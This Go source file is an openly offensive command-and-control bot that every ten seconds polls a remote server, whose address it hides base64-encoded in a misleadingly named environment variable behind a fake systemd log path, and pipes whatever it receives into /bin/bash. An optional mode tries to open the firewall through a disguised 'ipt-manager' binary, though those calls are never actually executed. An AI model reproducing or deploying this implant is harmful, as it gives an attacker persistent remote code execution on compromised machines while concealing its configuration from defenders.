// Golang bot to pull commands from webserver and execute them
// Disclaimer: This barely works
// @author: degenerat3

package main

import (
	b64 "encoding/base64"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

var serv = getServer() //IP of flask serv
var src = "Snare"      // where is this calling back from
var loopTime = 10      //sleep time in secs

func getServer() string {
	envVar := os.Getenv("DEBUGGER_LOGGING") //fetch environment variable
	trimmedStr := strings.Replace(envVar, "/var/log/systemd-", "", 1)
	decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)
	return string(decoded)
}

func getIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ad := conn.LocalAddr().(*net.UDPAddr)
	ipStr := ad.IP.String()
	return ipStr
}

func pokeHole() {
	exec.Command("/usr/bin/ipt-manager", "-I", "INPUT", "1", "-j", "ACCEPT")
	exec.Command("/usr/bin/ipt-manager", "-I", "OUTPUT", "1", "-j", "ACCEPT")
	getCommands()
	exec.Command("/usr/bin/ipt-manager", "-D", "INPUT", "1")
	exec.Command("/usr/bin/ipt-manager", "-D", "OUTPUT", "1")
}

func getCommands() {
	ip := getIP()
	url := "http://" + serv + "/" + ip + "/" + src
	r, err := http.Get(url)
	if err != nil {
		return
	}
	defer r.Body.Close()
	txt, err := ioutil.ReadAll(r.Body)
	if err != nil {
		return
	}
	//exec.Command(string(txt))
	bsh := exec.Command("/bin/bash")
	stdin, _ := bsh.StdinPipe()
	go func() {
		defer stdin.Close()
		io.WriteString(stdin, string(txt))
	}()
	bsh.Run()
}

func main() {
	argslen := len(os.Args)
	if argslen < 2 {
		for {

			getCommands()
			time.Sleep(time.Duration(loopTime) * time.Second)
		}
	} else {
		if os.Args[1] == "-f" {
			pokeHole()
		} else {
			getCommands()
		}
	}

}
